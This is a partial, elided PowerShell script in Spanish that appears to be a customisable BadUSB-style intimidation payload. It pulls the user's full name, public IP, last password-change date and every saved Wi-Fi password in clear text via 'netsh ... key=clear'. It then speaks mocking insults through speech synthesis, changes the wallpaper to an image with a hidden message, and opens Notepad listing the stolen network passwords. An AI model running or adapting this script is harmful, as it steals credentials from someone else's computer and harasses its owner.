...
# Intro ---------------------------------------------------------------------------------------------------
 function Get-fullName {
    ...
    $fullName = Net User $Env:username | Select-String -Pattern "Nombre completo";$fullName = ("$fullName").TrimStart("Nombre completo")
...
#----------------------------------------------------------------------------------------------------
    $lowRAM = "$RAM gigas de ram? Podrías usar igual papel y boli"
    
    $okRAM = "$RAM gigas de ram, en serio? Tengo una calculadora con más capacidad de cómputo"
    
    $goodRAM = "$RAM gigas de ram? Seguro que tiene un teclado con lucecitas... eres un intento de streamer eh?"

    $impressiveRAM = "$RAM gigas de ram? en serio? un super computador sin seguridad, bastante cómico"
#----------------------------------------------------------------------------------------------------
...
function Get-PubIP {
 ...
 # If no Public IP is detected function will return $null to avoid sapi speak
    ...
    return "Tu dirección I P pública es $computerPubIP"
}
...
function Get-Pass {
    ...
    $pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Contenido de la clave'; $pass = [string]$pass
...
# ENTER YOUR CUSTOM RESPONSES HERE
#----------------------------------------------------------------------------------------------------
    $badPASS = "$pro no es un nombre muy creativo, pero al menos no es tan malo como tu contraseña wifi... solo $pwl caracteres de longitud? $pass ...? en serio..? $pass es lo mejor que se te pudo ocurrir?"
    
    $okPASS = "$pro no es un nombre muy creativo, pero al menos lo estás intentando, tu contraseña tiene $pwl caracteres, aunque sigue siendo basura.. $pass ...? Puedes hacerlo mejor"
    
    $goodPASS = "$pro no es un nombre muy creativo, pero al menos parece que no eres un idiota total... una contraseña de $pwl caracteres no está tan mal, aunque no te ha logrado salvar de mí? no..puedo..hacerlo! sin embargo, $pass es una contraseña decente."
#----------------------------------------------------------------------------------------------------
...
Foreach($WLANProfileName in $WLANProfileNames){
    ...
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Contenido de la clave") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "La contraseña no está guardada en este perfil"
    }
...
# this is the message that will be coded into the image you use as the wallpaper
	...
	$hiddenMessage = "`n`nMi crimen es la curiosidad `n y sí, la curiosidad mató al gato, `n pero la satisfacción le trajo de vuelta"
...
# This will open up notepad with all their saved networks and passwords and taunt them
	...
	$s.Speak("Quieres ver algo bastante impresionante?")
	Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
	$s.Speak("Mira todas las contraseñas que tengo..")
	Start-Sleep -Seconds 1
	$s.Speak("Aquí tienes todas las contraseñas wifi para todas las redes a las que te has conectado en tu vida!")
	Start-Sleep -Seconds 1
	$s.Speak("Podrías enviarmelas a mí mismo, pero no lo haré")
...
#>
 ...
 function Get-Days_Set {
    ...
    $pls = net user $env:UserName | Select-String -Pattern "Ultimo cambio de contraseña" ; $pls = [string]$pls
...
# ENTER YOUR CUSTOM RESPONSES HERE 
#---------------------------------------------------------------------------------------------------- 
    $newPass = "$pls fue la última vez que cambiaste tu contraseña... Cambiaste tu contraseña hace $days días.. Tengo que aplaudirte.. al menos cambias tu contraseña con regularidad! "
    
    $avgPASS = "$pls fue la última vez que cambiaste tu contraseña... Han pasado $days días desde que cambiaste tu contraseña, estás empezando a jugar con fuego " 
    
    $oldPASS = "$pls fue la última vez que cambiaste tu contraseña... Han pasado $days días desde que cambiaste tu contraseña, estabas pidiendo básicamente que te hackeen, y aquí estoy! "
#----------------------------------------------------------------------------------------------------      
...
$intro = "$fullName , ha pasado tiempo querido amigo"
...
$OUTRO =  "Mi crimen es la curiosidad.... 	y sí, la curiosidad mató al gato....   pero la satisfacción le trajo de vuelta.... nos vemos $fullName"
